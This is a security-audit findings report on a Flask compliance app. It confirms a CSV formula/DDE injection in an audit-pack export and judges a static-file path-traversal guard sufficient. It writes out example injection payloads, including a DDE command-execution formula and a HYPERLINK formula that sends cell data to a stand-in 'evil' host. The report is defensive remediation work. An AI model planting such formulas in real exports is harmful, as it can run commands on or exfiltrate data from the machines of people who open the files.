## Findings

- F1 [fix] app/features/compliant/routes/api_routes.py:288-321 — CSV formula/DDE injection in the audit-pack CSV export (`GET /api/compliant/reports/<id>?format=csv`)
  evidence: semgrep `python.flask.security.injection.csv-writer-injection` fires on this exact block (lines 304-316). `record.get("title")` and `record.get("evidence_reference")` are attacker-influenced free text (validated only for length/type in `create_record`, `api_routes.py:176-198`) written straight into CSV cells via `csv.writer.writerow` with no leading-character guard. A record created with `title = "=cmd|'/c calc'!A1"` or `=HYPERLINK("http://evil/?x="&A1,"x")` round-trips unmodified into the exported file. Any org member can create a record (`POST /api/compliant/records` requires only `@requires_auth`, no ADMIN gate — matches spec, this isn't an authz gap), so the injection point does not require elevated privilege.
  severity: Medium-High. Audit packs are the product's explicit purpose — generated for and handed to external auditors/regulators/accountants who open them in Excel/Sheets/LibreOffice. A formula opened by that external, higher-trust reader can trigger command execution (legacy Excel DDE), exfiltrate data via `HYPERLINK`/`WEBSERVICE`, or otherwise abuse formula evaluation, depending on the opening application's settings. `control_id`, `framework`(_slug), `record_type`, and `status` are all validated against static allow-lists/catalogues before storage and are NOT attacker-controlled free text — only `title` and `evidence_reference` need the guard.
  repro: `POST /api/compliant/records` with `title` beginning `=`, `+`, `-`, or `@`, then `GET /api/compliant/reports/<id>?format=csv` — the raw formula prefix appears unescaped in the response body.
  patch: not applied (read-only stage). Recommended fix: prefix any cell value that starts with `=`, `+`, `-`, `@`, tab, or CR with a `'` (or space) before writing — apply to `title` and `evidence_reference` specifically in the `writer.writerow([...])` call at api_routes.py:304-316. No existing sanitizer elsewhere in the app to reuse (confirmed via grep for `csv.writer`/formula-escaping helpers) — this needs a small new helper, e.g. `_csv_safe(value)`, colocated with the export or in a shared utils module if a second CSV export appears.
  rule_added: none — already caught by the community rule `python.flask.security.injection.csv-writer-injection` (`p/flask` pack), which fired on first scan. No repo-specific `.semgrep/rules/learned.yml` addition needed since the existing rule already gates future occurrences of this exact pattern.
  routing recommendation: small, scoped patch — route to **fix-bug** (flagged security) per the skill's routing table, since this stage may not patch; a red-then-green repro test (CSV export of a record with a `=`-prefixed title must come back escaped) should accompany the fix.
  history: recorded `confirmed` in `scripts/finding_history.py` (sig `a44d57be6c2b`, area `app/features/compliant`, kind `csv-writer-injection`) so a recurrence after the fix ships is flagged as a regression, not re-litigated as new.

- **CSV export — beyond the confirmed F1** — verified the other CSV columns are not independently injectable: `framework_slug` (enum-checked against `framework_by_slug()` at write time), `control_id` (checked against the framework's static `control_ids` set), `record_type`/`status` (checked against fixed `_RECORD_TYPES`/`_RECORD_STATUSES`), and the three date columns (typed `date` objects, ISO-serialised) cannot carry a formula payload. - **`/compliant/static/<filename>` path-traversal guard** (compliant_bp.py:18-23) — the specific question the task asked ("is it actually sufficient"):
  - `<path:filename>` lets Flask/Werkzeug pass a value containing `/`, but the guard explicitly rejects any `filename` containing `/` — so a traversal payload has no directory separator to work with in the first place; the `".." in filename` check is then redundant-but-harmless defense in depth (a payload without `/` can still literally be the two characters `..`, which the extension check below would also reject since it doesn't end in `.js`/`.css`).
  - Extension allow-list (`.endswith((".js", ".css"))`) closes the remaining gap: even if traversal characters slipped past the first two checks, `send_from_directory` still resolves the final path via Werkzeug's own `safe_join`-equivalent (`werkzeug.utils.send_from_directory` → `safe_join(directory, path)`), which independently rejects `..`-escaping — so this is defense in depth on top of a second, independent guard, not the sole line of defense the inline comment implies.
  - Checked URL-encoding bypass: Werkzeug decodes `%2F`/`%2E` before the value reaches the view function for a `<path:>` converter, so an encoded payload arrives as literal `/`/`.` characters and is caught by the same checks — no decode-after-check gap found.
  - Conclusion: sufficient. No finding.
